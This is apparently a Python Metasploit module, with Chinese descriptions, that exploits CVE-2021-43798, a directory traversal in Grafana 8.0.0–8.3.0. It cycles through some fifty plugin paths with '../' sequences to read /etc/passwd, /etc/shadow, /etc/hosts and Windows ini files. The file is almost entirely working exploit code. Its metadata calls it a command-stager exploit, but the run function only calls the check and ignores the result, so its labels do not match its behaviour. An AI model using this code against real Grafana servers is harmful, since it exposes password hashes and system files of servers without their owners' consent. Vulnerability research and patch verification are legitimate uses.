#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests, socket, urllib
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'Grafana plugin 任意文件读取漏洞',
    'description': '''Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana 可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露 Grafana 中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。''',
    'authors': ['dhh'],
    'date': '2021-12-06',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'cve', 'ref': 'CVE-2021-43798'},
        {'type': 'cwe', 'ref': '548'},
        {'type': 'url', 'ref': 'https://www.cve.org/CVERecord?id=CVE-2021-43798'},
    ],
    'type': 'remote_exploit_cmd_stager',
    'rank': 'excellent',
    'wfsdelay': 5,
    'targets': [
        {'platform': 'linux', 'arch': 'all'},
        {'platform': 'windows', 'arch': 'all'}
    ],
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'rhosts': {'type': 'address', 'description': 'Host to target', 'required': True},
        'rport': {'type': 'port', 'description': 'Port to target', 'required': True}

    },
    "metric": {
        "score": 8.2, #评分
        "vector": "Network", #攻击路径
        "complexity": "Low", #攻击复杂度
        "privilege": "None", #权限要求
        "scope": "changed", #影响范围
        "maturity": "Poc", #exp成熟度
        "remediation": "Official", #补丁情况
        "confidentiality": "High", #数据保密性
        "integrity": "High", #数据完整性
        "harmness": "Low", #服务器危害
        "scale": None, #全网数量
    },
    "affected_version": "Grafana 8.0.0 - 8.3.0", #影响版本
    "suggestion": "建议升级该组件至最新版本。"
}

def vulscan(args):
    ip = args["rhosts"]
    port = args["rport"]
    url = "http://" + ip + ":" + str(port) + "/public/plugins/"
    plugins = ["alertGroups", "alertlist", "alertmanager", "annolist", "barchart", "bargauge", "canvas", "cloudwatch", "dashboard", "dashlist", "debug", "elasticsearch", "gauge", "geomap", "gettingstarted", "grafana-azure-monitor-datasource", "grafana", "graph", "graphite", "heatmap", "histogram", "influxdb", "jaeger", "live", "logs", "loki", "mixed", "mssql", "mysql", "news", "nodeGraph", "opentsdb", "piechart", "pluginlist", "postgres", "prometheus", "stat", "state-timeline", "status-history", "table-old", "table", "tempo", "testdata", "text", "timeseries", "welcome", "xychart", "zipkin", "cloud-monitoring", "cloudwatch", "alertmanager", "dashboard"]
    payload = "/../../../../../../../../../../.."
    dic = {
        "/etc/passwd": "root:",
        "/C:/windows/win.ini": "app support",
        "/etc/shadow": "root:",
        "/etc/hosts": "localhost",
        "/C:/windows/system.ini": "app support",
        "/C:/Windows/System32/drivers/etc/hosts": " localhost",
    }
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    }
    # proxy = {
    #     "http" : "http://127.0.0.1:8080",
    # }
    try:
        for item1, item2 in dic.items():
            for plugin in plugins:
                vul_url = url + plugin + payload + item1
                # print(vul_url)
                # req = requests.get(url=vul_url, headers=headers, timeout=(3, 7), allow_redirects=False, proxies=proxy)
                # print(req.request.headers)
                # print(req.text)
                # if (item2 in req.text):
                #     print(req.text)
                #     print(item2)
                re = urllib.request.Request(url=vul_url, headers=headers)
                res = urllib.request.urlopen(re, timeout=3)
                code = res.getcode()
                con = res.read().decode('utf-8')
                #print(con)
                if (code == 200) and (item2 in con):
                    return "appears"
    except Exception as e:
        #print(e)
        pass
    return "safe"

def run(args):
    # 自定义模块时，主要的逻辑代码放在此处 ---start
    # module.log("%s" % args['DATA'])  # 如果要打印信息到msfconsole的话，必须使用module.log函数哟。
    vulscan(args)
    # 自定义模块时，主要的逻辑代码放在此处 ---end

if __name__ == '__main__':
    module.run(metadata, run, soft_check=vulscan)